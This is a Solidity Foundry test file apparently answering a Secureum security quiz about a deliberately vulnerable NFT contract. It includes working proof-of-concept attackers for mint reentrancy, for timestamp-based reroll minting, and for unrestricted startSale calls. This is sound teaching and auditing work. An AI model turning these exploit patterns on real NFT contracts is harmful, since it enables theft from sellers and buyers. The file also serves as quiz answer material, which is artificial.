// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { InSecureumNFT, ERC721TokenReceiver } from "../src/Race3.sol";

contract InSecureumNFTTestBase is Test {
    InSecureumNFT nft;
    address payable benificiary = payable(makeAddr("benificiary"));

    function setUp() public virtual {
        nft = new InSecureumNFT(benificiary);
    }
}

// NOTE Q1 does not require tests

contract R3_Q2_Buyer is ERC721TokenReceiver {
    InSecureumNFT nft;
    constructor(address _nft) payable {
        nft = InSecureumNFT(_nft);
    }

    function onERC721Received(  address _operator, 
                                address _from, 
                                uint256 _tokenId, 
                                bytes calldata _data) external returns(bytes4) {
        bytes4 retval = 0x11223344;
        return retval;                                    
    }

    function buyNFT(uint price) public returns(uint) {
        uint id = nft.mint{value: price}();
        // console.log("NFT: ", id);
        require(id < 3, "NFT not valuable enough");
        return id;
    }

    receive() external payable {}
}

contract R3_Q2 is InSecureumNFTTestBase {
    uint INIT_SALE_PRICE = 10000;
    R3_Q2_Buyer buyerContract;

    function setUp() public override {
        // set to current timestamp on ethereum mainnet
        vm.warp(1725355264);
        super.setUp();
        nft.startSale(INIT_SALE_PRICE);
        // deploy the buyer contract with some ether so it can buy some NFTs
        buyerContract = new R3_Q2_Buyer{value: 1 ether}(address(nft));
    }

    function test_BuyersCanRepeatedlyMintAndRevertUntilTheyReceiveDesiredNFT() public {
        // the following could be performed in a script by an attacker...

        // if we mint now it will generate an NFT id which is too high (not valueable enough)
        vm.expectRevert("NFT not valuable enough");
        buyerContract.buyNFT(INIT_SALE_PRICE);
        
        // if we wait until 1725355300 it will still generate an NFT id which is too high (not valueable enough)
        vm.warp(1725355300);
        vm.expectRevert("NFT not valuable enough");
        buyerContract.buyNFT(INIT_SALE_PRICE);

        // if we mint at exactly 1725355333 then we get NFT ID 1
        vm.warp(1725355333);
        uint currentPrice = nft.getPrice();
        uint id = buyerContract.buyNFT(INIT_SALE_PRICE);
        assertEq(id, 1);

        // benefitial has only recived one sales worth of ether
        assertEq(benificiary.balance, currentPrice);
    }
}

// NOTE Q3 does not require tests

contract R3_Q4_Attacker is ERC721TokenReceiver {
    InSecureumNFT nft;
    uint price;
    uint buyCount = 1;
    uint[] internal mintedNFTs;

    constructor(address _nft, uint _price) payable {
        nft = InSecureumNFT(_nft);
        price = _price;
    }

    function onERC721Received(  address _operator, 
                                address _from, 
                                uint256 _tokenId, 
                                bytes calldata _data) external returns(bytes4) {
        bytes4 retval = 0x11223344;

        if(buyCount < nft.SALE_LIMIT()) {
            buyCount +=1;
            // reenter nft contract here to keep buying more NFT 
            // without sending any additional Ether value!
            uint id = nft.mint();
            mintedNFTs.push(id);
            console.log(id);
        }

        return retval;
    }

    function attack() public {
        uint id = nft.mint{value: price}();
        mintedNFTs.push(id);
    }

    function mintedNFTsCount() public returns(uint) {
        return mintedNFTs.length;
    }

    receive() external payable {}
}

contract R3_Q4 is InSecureumNFTTestBase {
    uint INIT_SALE_PRICE = 10_000;
    R3_Q4_Attacker attackerContract;

    function setUp() public override {
        super.setUp();
        nft.startSale(INIT_SALE_PRICE);
        // deploy the attacker contract with some ether so it can buy some NFTs
        attackerContract = new R3_Q4_Attacker{value: INIT_SALE_PRICE}(address(nft), INIT_SALE_PRICE);
    }

    function test_SusceptibleToReentrancyDuringMinting() public {
        assertEq(attackerContract.mintedNFTsCount(), 0);
        // call attack to reenter into the nft contract multiple times
        attackerContract.attack();
        // attacker contract balance is 0 since it spent the available funds 
        assertEq(address(attackerContract).balance, 0);
        // assert attacker has sale limit (5) NFTs
        assertEq(attackerContract.mintedNFTsCount(), nft.SALE_LIMIT());
        // however, the benificiary only received payment for one NFT
        assertEq(address(benificiary).balance, INIT_SALE_PRICE);
    }
}

// NOTE Q5 does not require tests

contract R3_Q6 is InSecureumNFTTestBase {
    address attacker = makeAddr("attacker");

    function test_startSaleCanBeCalledByAnyone() public {
        assertFalse(nft.publicSale());

        // can call and set price to 1 wei even if not the deployer
        vm.prank(attacker);
        nft.startSale(1);

        // assert public sale is open and price is 1 wei
        assertTrue(nft.publicSale());
        assertEq(nft.getPrice(), 1);
    }

    function test_startSaleCanBeCalledWithZeroPrice() public {
        assertFalse(nft.publicSale());
        // calling start sale as the deployer with a zero price!
        nft.startSale(0);

        // assert public sale is open and price is 0
        assertTrue(nft.publicSale());
        assertEq(nft.getPrice(), 0);
    }
}

// NOTE Q7 does not require tests

contract R3_Q8 is InSecureumNFTTestBase {
    address attacker1 = makeAddr("attacker1");
    address attacker2 = makeAddr("attacker2");
    function test_startSaleCanBeCalledByAnyoneAnyNumberOfTimes() public {
        vm.prank(attacker1);
        nft.startSale(1);

        // assert price is 1 wei
        assertEq(nft.getPrice(), 1);

        // now attacker2 cals the startSale function again with a different price
        vm.prank(attacker2);
        nft.startSale(2);

        // assert the price is now 2 wei after attacker2 calling startSale
        assertEq(nft.getPrice(), 2);
    }
}